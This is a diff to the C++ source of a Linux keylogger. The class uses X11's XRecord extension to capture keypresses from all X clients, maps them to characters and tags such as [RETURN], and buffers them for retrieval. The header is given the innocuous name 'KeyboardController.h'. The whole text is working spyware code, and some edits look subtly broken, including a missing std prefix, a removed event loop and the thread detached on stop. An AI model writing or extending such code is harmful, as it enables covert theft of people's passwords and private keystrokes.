@@ -1,7 +1,7 @@
 #include "KeyboardController.h"
 #ifdef __linux__
 
-std::string Keylogger::_buffer = "";
+std::vector<string> Keylogger::_buffer;
 std::mutex Keylogger::_mtx;
 
 Keylogger::Keylogger() : _isRunning(false), x11Display(0) {}
@@ -12,54 +12,42 @@ Keylogger::~Keylogger() {
 
 void Keylogger::append(const std::string& str) {
     std::lock_guard<std::mutex> lock(_mtx);
-    _buffer += str;
+    _buffer.push_back(str);
 }
 
 static Keylogger* g_keylogger = nullptr;
 
 void Keylogger::LinuxLoop() {
-    Display* display = XOpenDisplay(NULL);
-    if (!display) {
-        fprintf(stderr, "[Keylogger] Failed to open X display. Check X11 permissions!\n");
-        return;
-    }
+    Display* ctrlDisplay = XOpenDisplay(NULL);
+    Display* dataDisplay = XOpenDisplay(NULL);
+    if (!ctrlDisplay || !dataDisplay) return;
 
-    x11Display = (int)(intptr_t)display;
     g_keylogger = this;
-
-    XRecordContext context;
     XRecordRange* range = XRecordAllocRange();
-    if (!range) {
-        XCloseDisplay(display);
-        return;
-    }
-
     range->device_events.first = KeyPress;
-    range->device_events.last = KeyRelease;
-
-    XRecordClientSpec clientSpec = XRecordAllClients;
-    context = XRecordCreateContext(display, 0, &clientSpec, 1, &range, 1);
-    if (!context) {
-        XFree(range);
-        XCloseDisplay(display);
-        return;
-    }
-
+    range->device_events.last = KeyPress;
+    XRecordClientSpec spec = XRecordAllClients;
+    XRecordContext ctx = XRecordCreateContext(ctrlDisplay, 0, &spec, 1, &range, 1);
     XFree(range);
 
-    Display* dataDisplay = XOpenDisplay(NULL);
-    if (!dataDisplay) {
-        XRecordFreeContext(display, context);
-        XCloseDisplay(display);
+    if (!ctx) {
+        XCloseDisplay(ctrlDisplay);
+        XCloseDisplay(dataDisplay);
         return;
     }
 
-    if (!XRecordEnableContext(dataDisplay, context, 
+    XRecordEnableContext(dataDisplay, ctx, 
         [](XPointer priv, XRecordInterceptData* data) {
             if (data->category == XRecordFromServer) {
                 xEvent* event = (xEvent*)data->data;
                 if (event->u.u.type == KeyPress) {
-                    KeySym keysym = XLookupKeysym(&event->u.keyButtonPointer, 0);
+                    XKeyEvent xke;
+                    memset(&xke, 0, sizeof(xke));
+                    xke.display = (Display*)priv;
+                    xke.keycode = event->u.u.detail;
+                    xke.state = 0;
+
+                    KeySym keysym = XLookupKeysym(&xke, 0);
                     
                     if (keysym == XK_Return) g_keylogger->append("[RETURN]");
                     else if (keysym == XK_Tab) g_keylogger->append("[TAB]");
@@ -98,36 +86,21 @@ void Keylogger::LinuxLoop() {
                     else if (keysym == XK_F15) g_keylogger->append("[F15]");
                     else if (keysym == XK_Num_Lock) g_keylogger->append("[NUMLOCK]");
                     else {
-                        char buffer[8] = {0};
-                        int length = XLookupString(&event->u.keyButtonPointer, buffer, sizeof(buffer) - 1, NULL, NULL);
+                        char buffer[32] = {0};
+                        int length = XLookupString(&xke, buffer, sizeof(buffer) - 1, NULL, NULL);
                         if (length > 0) {
-                            std::string s(buffer, length);
-                            if (s.length() > 0 && (unsigned char)s[0] >= 32) {
-                                g_keylogger->append(s);
-                            }
+                            g_keylogger->append(std::string(buffer, length));
                         }
                     }
+                    //XCloseDisplay(xke.display);
                 }
             }
             XRecordFreeData(data);
-        }, NULL)) {
-        XRecordFreeContext(display, context);
-        XCloseDisplay(dataDisplay);
-        XCloseDisplay(display);
-        return;
-    }
-
-    while (_isRunning) {
-        XRecordProcessReplies(dataDisplay);
-        XFlush(dataDisplay);
-        usleep(10000);
-    }
-
-    XRecordDisableContext(dataDisplay, context);
-    XRecordFreeContext(display, context);
+        }, (XPointer)ctrlDisplay); 
+        
+    XRecordFreeContext(ctrlDisplay, ctx);
     XCloseDisplay(dataDisplay);
-    XCloseDisplay(display);
-    x11Display = 0;
+    XCloseDisplay(ctrlDisplay);
 }
 
 void Keylogger::Start() {
@@ -144,14 +117,13 @@ void Keylogger::Stop() {
     _isRunning = false;
 
     if (_workerThread.joinable()) {
-        _workerThread.join();
+        _workerThread.detach();
     }
 }
 
-std::string Keylogger::getDataAndClear() {
+std::vector<std::string> Keylogger::getDataAndClear() {
     std::lock_guard<std::mutex> lock(_mtx);
-    if (_buffer.empty()) return "";
-    std::string dataCopy = _buffer;
+    std::vector<std::string> dataCopy = _buffer;
     _buffer.clear();
     return dataCopy;
 }
